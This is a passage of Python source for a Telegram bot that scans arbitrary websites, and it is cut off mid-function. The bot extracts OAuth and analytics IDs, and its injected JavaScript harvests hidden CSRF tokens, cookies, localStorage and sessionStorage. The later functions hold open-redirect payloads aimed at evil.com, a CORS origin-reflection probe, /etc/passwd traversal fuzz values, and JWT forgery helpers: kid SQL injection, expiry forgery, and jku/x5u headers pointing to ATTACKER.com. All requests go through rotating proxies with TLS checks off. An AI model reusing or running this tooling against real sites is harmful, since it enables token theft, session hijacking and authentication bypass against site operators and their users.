    try { if (window.AppleID) res['AppleID_loaded'] = 'true'; } catch(e){}
    // Check __ENV__ objects
    try {
        const envs = [window.__ENV__, window._env_, window.ENV, window.__NEXT_DATA__?.props?.pageProps];
        envs.forEach((e,i) => {
            if (!e) return;
            const s = JSON.stringify(e)||'';
            if (s.includes('CLIENT_ID')||s.includes('APP_ID')||s.includes('OAUTH')) {
                res['env_'+i] = s.substring(0, 500);
            }
        });
    } catch(e) {}
    return res;
}"""

def _socialkeys_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _SOCIAL_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    # ── Option A + B ──────────────────────────────────────────────────
    if progress_cb: progress_cb("🌐 Dynamic social SDK intercept + deep fetch...")
    dyn        = _playwright_dynamic_scan(url, "socialkeys", progress_cb)
    new_assets = _deep_asset_fetch(url, data.get("network_log", []), progress_cb)
    data       = _merge_dynamic_into_data(data, dyn, new_assets)

    # Merge FB.init / gapi hook results
    social_hook = dyn.get("hooks", {}).get("social", {})
    if social_hook:
        dr = data.get("dom_result") or {}
        dr["dyn_social_hooks"] = json.dumps(social_hook)[:2000]
        data["dom_result"] = dr

    findings = []; seen = set()
    def _add(t, v, src):
        d = t+":"+v[:60]
        if d not in seen and len(v) >= 5:
            seen.add(d); findings.append({"type": t, "value": v, "source": src})
    if progress_cb: progress_cb("🔍 Scanning for OAuth / social login IDs...")
    for text, label in _gather_all_text(data):
        for key_type, pat in _SOCIAL_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip(), label)
    for k, v in (data.get("dom_result") or {}).items():
        s = str(v)
        for key_type, pat in _SOCIAL_PATTERNS:
            mm = pat.search(s)
            if mm:
                _add(key_type, (mm.group(1) if mm.lastindex else mm.group(0)), f"window.{k}")
    return {"error": None, "findings": findings, "page_url": data["page_url"],
            "requests": len(data.get("network_log", []))}


async def cmd_socialkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/socialkeys <url> — Extract Google, Facebook, Apple, Discord OAuth IDs"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/socialkeys https://example.com`\n\n"
            "👤 *Detects:*\n"
            "  • Google OAuth Client ID\n"
            "  • Facebook App ID & Pixel ID\n"
            "  • Apple Client ID / Team ID\n"
            "  • GitHub, Twitter/X, LinkedIn, Discord\n"
            "  • Spotify, Amazon Cognito, Auth0, Okta\n"
            "  • Microsoft Azure App ID\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"👤 *OAuth Key Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"👤 *Social Keys — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_socialkeys_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel(); await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown'); return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown'); return
    findings = result["findings"]; page_url = result["page_url"]
    if not findings:
        await msg.edit_text(
            f"👤 *OAuth Key Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No social/OAuth keys found\n🌐 `{page_url}`", parse_mode='Markdown')
        return
    lines = [f"👤 *Social / OAuth Keys — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
    for i, f in enumerate(findings, 1):
        lines.append(f"*[{i}] {f['type']}*")
        lines.append(f"  `{f['value'][:80]}`")
        lines.append(f"  _📂 {f['source'][:60]}_\n")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
                "scanned_at": datetime.now().isoformat(), "findings": findings},
                indent=2, ensure_ascii=False).encode()),
            filename=f"socialkeys_{safe_d}_{ts}.json",
            caption=f"👤 Social Keys — `{domain}` — `{len(findings)}` found",
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("socialkeys export error: %s", e)


# ══════════════════════════════════════════════════
# 📊  5. /analytics — Analytics ID Extractor
# ══════════════════════════════════════════════════

_ANALYTICS_PATTERNS = [
    ("Google Analytics 4",      re.compile(r'\b(G-[A-Z0-9]{8,12})\b')),
    ("Google Analytics UA",     re.compile(r'\b(UA-\d{5,10}-\d{1,3})\b')),
    ("Google Tag Manager",      re.compile(r'\b(GTM-[A-Z0-9]{5,8})\b')),
    ("Facebook Pixel ID",       re.compile(r'(?i)fbq\s*\(["\']init["\']\s*,\s*["\']?(\d{10,20})')),
    ("Facebook Dataset ID",     re.compile(r'(?i)fb\.{0,5}dataset.{0,10}[=:\s]["\']?(\d{10,20})\b')),
    ("Hotjar Site ID",          re.compile(r'(?i)hjid\s*[:=]\s*(\d{5,10})\b')),
    ("Hotjar Version",          re.compile(r'(?i)hjsv\s*[:=]\s*(\d{1,2})\b')),
    ("Mixpanel Token",          re.compile(r'(?i)mixpanel\.init\s*\(\s*["\']([A-Za-z0-9]{32})["\']')),
    ("Segment Write Key",       re.compile(r'(?i)analytics\.load\s*\(\s*["\']([A-Za-z0-9]{20,50})["\']')),
    ("TikTok Pixel ID",         re.compile(r'(?i)ttq\.load\s*\(\s*["\']([A-Za-z0-9]{18,22})["\']')),
    ("Snapchat Pixel ID",       re.compile(r'(?i)snaptr\s*\(["\']init["\']\s*,\s*\{[^}]*["\'](\b[A-Za-z0-9\-]{30,50}\b)["\']')),
    ("Pinterest Tag ID",        re.compile(r'(?i)pintrk\s*\(["\']load["\']\s*,\s*["\']?(\d{12,15})["\']?')),
    ("LinkedIn Insight Tag",    re.compile(r'(?i)_linkedin_partner_id\s*=\s*["\']?(\d{6,10})["\']?\s*;')),
    ("Clarity Project ID",      re.compile(r'(?i)clarity\s*\(\s*["\']set["\']\s*,\s*["\']([A-Za-z0-9]{10,20})["\']')),
    ("Amplitude API Key",       re.compile(r'(?i)amplitude\.init\s*\(\s*["\']([A-Za-z0-9]{32})["\']')),
    ("Heap App ID",             re.compile(r'(?i)heap\.load\s*\(\s*["\'](\d{8,12})["\']')),
    ("Intercom App ID",         re.compile(r'(?i)intercom\.{0,5}(?:app.{0,3}id|appid).{0,10}[=:\s]["\']([A-Za-z0-9]{8,15})["\']')),
    ("Crisp Website ID",        re.compile(r'(?i)crisp.{0,20}website.{0,5}id.{0,10}[=:\s]["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']')),
    ("FullStory Org ID",        re.compile(r'(?i)FS\.identify|_fs_org\s*=\s*["\']([A-Za-z0-9]{5,20})["\']')),
    ("Clicky Site ID",          re.compile(r'(?i)clicky_site_id\s*=\s*(\d{6,12})\b')),
]

_ANALYTICS_JS_EVAL = """() => {
    const res = {};
    // Google Analytics dataLayer
    try {
        if (window.dataLayer && Array.isArray(window.dataLayer)) {
            res['dataLayer_length'] = window.dataLayer.length;
            res['dataLayer_sample'] = JSON.stringify(window.dataLayer.slice(0,3)).substring(0,500);
        }
    } catch(e) {}
    // gtag config calls
    try {
        if (window.gtag) res['gtag_loaded'] = 'true';
        if (window.ga) res['ga_loaded'] = 'true';
    } catch(e) {}
    // Meta pixel
    try { if (window.fbq) res['fbq_loaded'] = 'true'; } catch(e) {}
    return res;
}"""

def _analytics_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _ANALYTICS_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    # ── Option A + B ──────────────────────────────────────────────────
    if progress_cb: progress_cb("🌐 Dynamic analytics SDK intercept + deep fetch...")
    dyn        = _playwright_dynamic_scan(url, "analytics", progress_cb)
    new_assets = _deep_asset_fetch(url, data.get("network_log", []), progress_cb)
    data       = _merge_dynamic_into_data(data, dyn, new_assets)

    # Merge gtag/fbq/mixpanel hook results into dom_result for pattern scan
    ana_hook = dyn.get("hooks", {}).get("analytics", {})
    if ana_hook:
        dr = data.get("dom_result") or {}
        dr["dyn_analytics_hooks"] = json.dumps(ana_hook)[:2000]
        data["dom_result"] = dr

    findings = []; seen = set()
    def _add(t, v, src):
        d = t+":"+v
        if d not in seen and len(v) >= 3:
            seen.add(d); findings.append({"type": t, "value": v, "source": src})
    if progress_cb: progress_cb("🔍 Scanning for analytics IDs...")
    for text, label in _gather_all_text(data):
        for key_type, pat in _ANALYTICS_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip(), label)
    return {"error": None, "findings": findings, "page_url": data["page_url"],
            "requests": len(data.get("network_log", []))}


async def cmd_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/analytics <url> — Extract GA4, GTM, FB Pixel, Hotjar, Mixpanel and more"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/analytics https://example.com`\n\n"
            "📊 *Detects:*\n"
            "  • Google Analytics 4 (G-XXXXX) & UA\n"
            "  • Google Tag Manager (GTM-XXXXX)\n"
            "  • Facebook Pixel ID\n"
            "  • Hotjar, Mixpanel, Segment, Amplitude\n"
            "  • TikTok, Snapchat, Pinterest, LinkedIn\n"
            "  • Microsoft Clarity, Heap, FullStory\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"📊 *Analytics Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"📊 *Analytics — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_analytics_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel(); await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown'); return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown'); return
    findings = result["findings"]; page_url = result["page_url"]
    if not findings:
        await msg.edit_text(
            f"📊 *Analytics Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No analytics IDs found\n🌐 `{page_url}`", parse_mode='Markdown')
        return
    lines = [f"📊 *Analytics IDs — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
    for i, f in enumerate(findings, 1):
        lines.append(f"*[{i}] {f['type']}*  `{f['value']}`")
        lines.append(f"  _📂 {f['source'][:60]}_\n")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
                "scanned_at": datetime.now().isoformat(), "findings": findings},
                indent=2, ensure_ascii=False).encode()),
            filename=f"analytics_{safe_d}_{ts}.json",
            caption=f"📊 Analytics — `{domain}` — `{len(findings)}` found",
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("analytics export error: %s", e)


# ══════════════════════════════════════════════════
# 🔐  6. /hiddenkeys — Hidden Tokens & CSRF Extractor
# ══════════════════════════════════════════════════

_HIDDEN_JS_EVAL = """() => {
    const res = {tokens: [], localStorage: {}, sessionStorage: {}, cookies: []};
    // Hidden inputs + CSRF tokens
    document.querySelectorAll('input[type=hidden]').forEach(el => {
        if (el.name && el.value && el.value.length > 5) {
            res.tokens.push({name: el.name, value: el.value.substring(0,200), tag: 'hidden input'});
        }
    });
    // Meta CSRF
    document.querySelectorAll('meta[name*="csrf"],meta[name*="token"],meta[name*="nonce"]').forEach(m => {
        if (m.content) res.tokens.push({name: m.name, value: m.content.substring(0,200), tag: 'meta'});
    });
    // localStorage (safe subset)
    try {
        for (let i=0; i<Math.min(localStorage.length, 30); i++) {
            const k = localStorage.key(i);
            if (k) {
                const v = localStorage.getItem(k)||'';
                if (v.length > 5 && v.length < 2000) res.localStorage[k] = v.substring(0,200);
            }
        }
    } catch(e) {}
    // sessionStorage
    try {
        for (let i=0; i<Math.min(sessionStorage.length, 30); i++) {
            const k = sessionStorage.key(i);
            if (k) {
                const v = sessionStorage.getItem(k)||'';
                if (v.length > 5 && v.length < 2000) res.sessionStorage[k] = v.substring(0,200);
            }
        }
    } catch(e) {}
    // Cookies (non-httpOnly are readable)
    try {
        document.cookie.split(';').forEach(c => {
            const [k,v] = c.trim().split('=');
            if (k && v && v.length > 3) res.cookies.push({name: k.trim(), value: v.substring(0,200)});
        });
    } catch(e) {}
    return res;
}"""



# ─── PATCHED NEW FUNCTIONS/GLOBALS ─────────────────────

_OPEN_REDIRECT_PAYLOADS = [
    "//evil.com", "https://evil.com", "/\\evil.com",
    "/%2F%2Fevil.com", "//evil.com%2F%2E%2E",
    "https:///evil.com", "///evil.com",
    "/%09/evil.com", "https://evil.com%23",
    "https://evil.com?redirect=",
]


_REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "return",
    "return_to", "returnUrl", "next", "url", "goto",
    "dest", "destination", "target", "redir", "r",
]



def _check_cors_misconfig(url: str) -> dict:
    """Send evil origin, check if reflected in ACAO header."""
    evil_origin = "https://evil-attacker.com"
    try:
        r = requests.options(
            url, timeout=8, verify=False,
            headers={**_get_headers(), "Origin": evil_origin},
            proxies=proxy_manager.get_proxy()
        )
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if evil_origin in acao or acao == "*":
            risk = "CRITICAL" if acac.lower() == "true" else "HIGH"
            return {
                "vulnerable": True,
                "acao": acao,
                "acac": acac,
                "severity": risk,
                "note": (
                    "CRITICAL: Origin reflected + credentials=true → full auth bypass"
                    if risk == "CRITICAL"
                    else "HIGH: Origin reflected → data leakage possible"
                ),
            }
    except Exception:
        pass
    return {"vulnerable": False}



def _check_open_redirect(url: str) -> list:
    """Test common redirect params with evil payloads."""
    found = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in _REDIRECT_PARAMS[:6]:
        for payload in _OPEN_REDIRECT_PAYLOADS[:5]:
            test_url = f"{base}?{param}={payload}"
            try:
                r = requests.get(
                    test_url, timeout=5, verify=False,
                    headers=_get_headers(),
                    proxies=proxy_manager.get_proxy(),
                    allow_redirects=False,
                )
                loc = r.headers.get("Location", "")
                if r.status_code in (301, 302, 303, 307, 308) and (
                    "evil" in loc or loc.startswith("//") or loc.startswith("https://evil")
                ):
                    found.append({
                        "param":    param,
                        "payload":  payload,
                        "location": loc[:120],
                        "status":   r.status_code,
                        "severity": "HIGH",
                    })
                    break  # one hit per param is enough
            except Exception:
                pass
    return found



_TECH_WORDLISTS = {
    "Laravel":   [
        ".env", "artisan", "storage/logs/laravel.log",
        "public/storage", "api/user", "api/auth/login",
        "telescope", "horizon", "_ignition/health-check",
    ],
    "Django":    [
        "admin/", "admin/login/", "api/schema/", "api/docs/",
        "static/admin/", "__debug__/", "api/v1/", "api/v2/",
    ],
    "WordPress": [
        "wp-admin/", "wp-login.php", "wp-json/wp/v2/users",
        "xmlrpc.php", "wp-content/debug.log", "wp-config.php.bak",
        "wp-content/uploads/", "readme.html",
    ],
    "Rails":     [
        "rails/info/properties", "rails/info/routes",
        "sidekiq", "api/v1/", "cable", "active_storage/",
    ],
    "Express":   [
        "api/", "api/v1/", "graphql", "swagger.json",
        "openapi.json", "metrics", "health", "status",
    ],
    "Spring":    [
        "actuator/", "actuator/health", "actuator/env",
        "actuator/mappings", "actuator/beans", "swagger-ui.html",
        "v2/api-docs", "h2-console/",
    ],
    "Next.js":   [
        "_next/static/", "api/", "api/auth/", "api/graphql",
        "_next/data/", "404", "__nextjs_original-stack-frame",
    ],
    "FastAPI":   [
        "docs", "redoc", "openapi.json", "api/v1/",
        "healthz", "metrics",
    ],
}


_BACKUP_EXTENSIONS = [
    ".bak", ".old", ".orig", ".swp", ".tmp", "~",
    ".backup", ".copy", ".save", ".1", ".2",
    ".tar.gz", ".zip", ".sql", ".sql.gz",
]


_SMART_FUZZ_PARAMS = {
    "debug": ["1", "true", "yes"],
    "test":  ["1", "true"],
    "id":    ["1", "0", "-1", "9999"],
    "page":  ["../etc/passwd", "....//....//etc/passwd"],
    "file":  ["../etc/passwd", "/etc/passwd"],
    "admin": ["1", "true"],
    "token": ["null", "undefined", ""],
    "format": ["json", "xml", "yaml"],
    "callback": ["test", "jsonp"],
    "pretty": ["1", "true"],
    "XDEBUG_SESSION_START": ["phpstorm"],
}



def _detect_tech_stack(url: str) -> list:
    """Quick tech stack detection for wordlist selection."""
    detected = []
    try:
        r = requests.get(
            url, timeout=8, verify=False,
            headers=_get_headers(),
            proxies=proxy_manager.get_proxy()
        )
        body    = r.text[:50000]
        headers = dict(r.headers)
        powered = headers.get("X-Powered-By", "").lower()
        server  = headers.get("Server", "").lower()
        cookie  = str(headers.get("Set-Cookie", "")).lower()

        sigs = {
            "Laravel":   ["laravel_session", "laravel", "_ignition"],
            "Django":    ["csrfmiddlewaretoken", "django", "wsgi"],
            "WordPress": ["wp-content", "wp-json", "wordpress"],
            "Rails":     ["_rails", "x-runtime", "__proxyee"],
            "Express":   ["express", "x-powered-by: express"],
            "Spring":    ["x-application-context", "spring"],
            "Next.js":   ["__next", "_next/static", "__NEXT_DATA__"],
            "FastAPI":   ["fastapi", "docs#/"],
        }
        combined = body + powered + server + cookie
        for tech, patterns in sigs.items():
            if any(p.lower() in combined for p in patterns):
                detected.append(tech)
    except Exception:
        pass
    return detected



def _b64url_encode(d: dict) -> str:
    return (
        _b64.b64encode(json.dumps(d, separators=(",", ":")).encode())
        .decode().rstrip("=").replace("+", "-").replace("/", "_")
    )



def _jwt_kid_injection(token: str) -> dict:
    """
    kid header injection:
      - Path traversal → /dev/null or /etc/passwd
      - SQL injection → ' OR 1=1--
    """
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False}
    try:
        dec = _jwt_decode_payload(token)
        if "error" in dec:
            return {"success": False, "error": dec["error"]}

        payloads = {
            "path_traversal_null":   "../../../../../../dev/null",
            "path_traversal_passwd": "../../../../../../etc/passwd",
            "sql_injection":         "' UNION SELECT 'attacker_secret' --",
            "sql_injection_mysql":   "0 UNION SELECT 'attacker_secret'",
            "empty_string":          "",
        }
        forged = {}
        for name, kid_val in payloads.items():
            # Sign with empty string / null-derived secret
            h = {**dec["header"], "kid": kid_val}
            forged[name] = {
                "header":      h,
                "token_prefix": f"{_b64url_encode(h)}.{parts[1]}.",
                "note":        "Sign with empty string '' as secret if kid resolves to /dev/null",
            }

        return {
            "success":  True,
            "method":   "kid_injection",
            "payloads": forged,
            "note":     (
                "If server uses kid to load secret key from filesystem or DB, "
                "path traversal or SQLi in kid may allow forging any payload."
            ),
        }
    except Exception as e:
        return {"success": False, "error": str(e)}



def _jwt_exp_forgery(token: str) -> dict:
    """Forge exp, nbf, iat claims to extend validity."""
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False}
    try:
        dec = _jwt_decode_payload(token)
        if "error" in dec:
            return {"success": False, "error": dec["error"]}

        payload = dict(dec["payload"])
        orig_exp = payload.get("exp", "not set")
        payload["exp"] = 9999999999   # year 2286
        payload["nbf"] = 0
        payload["iat"] = 0

        forged_payload_b64 = _b64url_encode(payload)
        note = (
            "Replace the payload segment with this and keep original sig. "
            "Works if server skips exp validation or uses 'alg: none'."
        )
        return {
            "success":          True,
            "original_exp":     orig_exp,
            "forged_exp":       9999999999,
            "forged_payload":   forged_payload_b64,
            "full_token_template": f"{parts[0]}.{forged_payload_b64}.{parts[2]}",
            "method":           "exp_forgery",
            "note":             note,
        }
    except Exception as e:
        return {"success": False, "error": str(e)}



def _jwt_jwks_spoof(token: str, target_url: str = "") -> dict:
    """
    jku / x5u header injection — point to attacker-controlled JWKS.
    Also checks if /.well-known/jwks.json is publicly accessible.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False}
    try:
        dec = _jwt_decode_payload(token)
        if "error" in dec:
            return {"success": False}

        orig_alg = dec["header"].get("alg", "HS256")
        rs_likely = orig_alg in ("RS256", "RS384", "RS512", "ES256", "ES384")

        jwks_public = None
        if target_url:
            parsed = urlparse(target_url)
            jwks_url = f"{parsed.scheme}://{parsed.netloc}/.well-known/jwks.json"
            try:
                r = requests.get(jwks_url, timeout=6, verify=False, headers=_get_headers())
                if r.status_code == 200 and "keys" in r.text:
                    jwks_public = jwks_url
            except Exception:
                pass

        spoof_template = {
            "jku": {
                "header_addition": {"jku": "https://ATTACKER.com/jwks.json"},
                "note": "Server fetches JWK from jku URL to verify sig — point to attacker-controlled server",
            },
            "x5u": {
                "header_addition": {"x5u": "https://ATTACKER.com/cert.pem"},
                "note": "Server fetches X.509 cert from x5u to verify sig — embed attacker cert",
            },
            "embedded_jwk": {
                "header_addition": {"jwk": {"kty": "RSA", "n": "ATTACKER_N", "e": "AQAB"}},
                "note": "Embed attacker public key directly in header — server verifies with it",
            },
        }

        return {
            "success":         True,
            "method":          "jwks_spoof",
            "original_alg":    orig_alg,
            "rs_likely":       rs_likely,
            "jwks_public_url": jwks_public,
            "injection_templates": spoof_template,
            "note": (
                "RS256/ES256 tokens are most vulnerable. "
                + ("JWKS endpoint exposed at: " + jwks_public if jwks_public else "JWKS not publicly found.")
            ),
        }
    except Exception as e:
        return {"success": False, "error": str(e)}



_HIDDEN_JS_EVAL_IMPROVED = """async () => {
    const res = {tokens: [], localStorage: {}, sessionStorage: {}, cookies: [], indexedDBKeys: [], shadowTokens: []};

    // ── Hidden form inputs (main DOM) ──
    document.querySelectorAll('input[type=hidden], input[type=text][name*=token], input[name*=csrf], input[name*=nonce], input[name*=verify]').forEach(el => {
        if (el.value && el.value.length >= 8) {
            res.tokens.push({name: el.name || el.id || 'hidden', value: el.value.substring(0, 200), tag: el.tagName});
        }
    });

    // ── Meta tag tokens ──
    document.querySelectorAll('meta[name]').forEach(m => {
        const n = (m.getAttribute('name') || '').toLowerCase();
        const c = m.getAttribute('content') || '';
        if ((n.includes('csrf') || n.includes('token') || n.includes('nonce') || n.includes('xsrf')) && c.length >= 8) {
            res.tokens.push({name: n, value: c.substring(0, 200), tag: 'META'});
        }
    });

    // ── ShadowDOM (open mode) traversal ──
    // Closed-mode roots inaccessible from JS — we patch open ones.
    try {
        const walk = (root) => {
            root.querySelectorAll('*').forEach(el => {
                if (el.shadowRoot) {
                    el.shadowRoot.querySelectorAll('input[type=hidden], input[name*=csrf], input[name*=token], input[name*=nonce]').forEach(si => {
                        if (si.value && si.value.length >= 8) {
                            res.shadowTokens.push({name: si.name || si.id || 'shadow-hidden', value: si.value.substring(0, 200), host: el.tagName});
                        }
                    });
                    walk(el.shadowRoot);
                }
            });
        };
        walk(document);
    } catch(e) {}

    // ── localStorage ──
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            const v = localStorage.getItem(k) || '';
            if (v.length >= 5) res.localStorage[k] = v.substring(0, 200);
        }
    } catch(e) {}

    // ── sessionStorage ──
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const k = sessionStorage.key(i);
            const v = sessionStorage.getItem(k) || '';
            if (v.length >= 5) res.sessionStorage[k] = v.substring(0, 200);
        }
    } catch(e) {}

    // ── JS-accessible cookies ──
    try {
        document.cookie.split(';').forEach(c => {
            const [name, ...rest] = c.trim().split('=');
            const value = rest.join('=');
            if (name && value && value.length >= 5) {
                res.cookies.push({name: name.trim(), value: value.trim().substring(0, 200)});
            }
        });
    } catch(e) {}

    // ── IndexedDB database names (async — fix: was in sync fn, always threw) ──
    try {
        const dbs = await indexedDB.databases();
        dbs.forEach(d => res.indexedDBKeys.push(d.name || 'unknown'));
    } catch(e) {
        res.indexedDBKeys.push('__idb_error__:' + String(e).substring(0, 80));
    }

    return res;
}"""



def _scan_service_worker(url: str) -> list:
    """
    Phase 2: SW scope + Workbox precache manifest parse.
    - Service-Worker-Allowed header → discover non-root scope SW paths
    - Workbox __WB_MANIFEST precache list → enumerate cached asset URLs
    - Cache install event URL list scan for tokens
    """
    parsed   = urlparse(url)
    origin   = f"{parsed.scheme}://{parsed.netloc}"
    sw_paths = [
        "/sw.js", "/service-worker.js", "/serviceworker.js",
        "/sw-v1.js", "/firebase-messaging-sw.js",
        "/sw-prod.js", "/sw-dev.js", "/ngsw.js",         # Angular SW
        "/OneSignalSDKWorker.js", "/push-worker.js",
    ]
    findings = []
    seen_sw  = set()

    # Phase 2: discover SW via Link header + SW registration in HTML
    try:
        page_r = requests.get(url, timeout=8, verify=False,
                              headers=_get_headers(), proxies=proxy_manager.get_proxy())
        # Check Service-Worker-Allowed header on any existing SW path
        scope_hint = page_r.headers.get("Service-Worker-Allowed", "")
        if scope_hint:
            findings.append({"type": "SW Scope", "name": "Service-Worker-Allowed",
                             "value": scope_hint[:200], "source": "Response header"})
        # Extract SW registration path from HTML
        sw_reg_pat = re.compile(
            r'serviceWorker\.register\([\'"]([^\'")]+\.js)[\'"]')
        for m in sw_reg_pat.finditer(page_r.text[:100000]):
            reg_path = m.group(1)
            if not reg_path.startswith("http"):
                reg_path = origin + ("" if reg_path.startswith("/") else "/") + reg_path
            sw_paths.insert(0, reg_path.replace(origin, ""))
    except Exception:
        pass

    for sw_path in list(dict.fromkeys(sw_paths)):  # deduplicate
        try:
            sw_url = origin + sw_path if sw_path.startswith("/") else sw_path
            r = requests.get(
                sw_url, timeout=6, verify=False,
                headers=_get_headers(), proxies=proxy_manager.get_proxy()
            )
            if r.status_code != 200 or len(r.text) < 100:
                continue
            text = r.text

            # Standard token/CSRF pattern scan
            for key_type, pat in _CSRF_PATTERNS:
                for m in pat.finditer(text):
                    val = (m.group(1) if m.lastindex else m.group(0)).strip()
                    dedup = key_type + ":" + val[:40]
                    if dedup not in seen_sw and len(val) >= 8:
                        seen_sw.add(dedup)
                        findings.append({
                            "type":   key_type,
                            "name":   key_type,
                            "value":  val[:200],
                            "source": f"Service Worker {sw_path}",
                        })

            # Phase 2: Workbox __WB_MANIFEST precache list
            if "__WB_MANIFEST" in text or "workbox" in text.lower():
                # Extract precache URLs — may contain API endpoints or token-bearing paths
                wb_urls = re.findall(
                    r'[{,]\s*"url"\s*:\s*"([^"]+)"', text)
                if wb_urls:
                    dedup_wb = "wb_manifest:" + str(sorted(wb_urls))[:60]
                    if dedup_wb not in seen_sw:
                        seen_sw.add(dedup_wb)
                        findings.append({
                            "type":   "Workbox precache manifest",
                            "name":   "WB_MANIFEST",
                            "value":  f"{len(wb_urls)} cached paths: " + ", ".join(wb_urls[:5]),
                            "source": f"Service Worker {sw_path}",
                        })

            # Phase 2: cache.addAll() URL list scan
            cache_urls = re.findall(
                r'cache(?:\.addAll\(|s\.open\()[^)]*[\'"]([^\'")]+)[\'"]')
            for cu in cache_urls:
                if any(kw in cu.lower() for kw in ["token","auth","api","key","secret"]):
                    dedup = "sw_cache:" + cu[:60]
                    if dedup not in seen_sw:
                        seen_sw.add(dedup)
                        findings.append({"type": "SW cache URL (suspicious)",
                                         "name": "cache_url", "value": cu[:200],
                                         "source": f"Service Worker {sw_path}"})
        except Exception:
            pass
    return findings



def _extract_csp_nonce(url: str) -> list:
    """
    Phase 3 Fix 5: CSP nonce entropy + predictability test.
    - Fetch 4 samples instead of 2
    - Shannon entropy calculation (< 3.5 bits/char = weak)
    - Sequence pattern check (counter-based nonces)
    - base64 decode attempt to estimate real entropy
    """
    import math, base64 as _b64n
    findings = []
    nonces_seen = []

    def _shannon_entropy(s: str) -> float:
        if not s:
            return 0.0
        freq = {}
        for c in s:
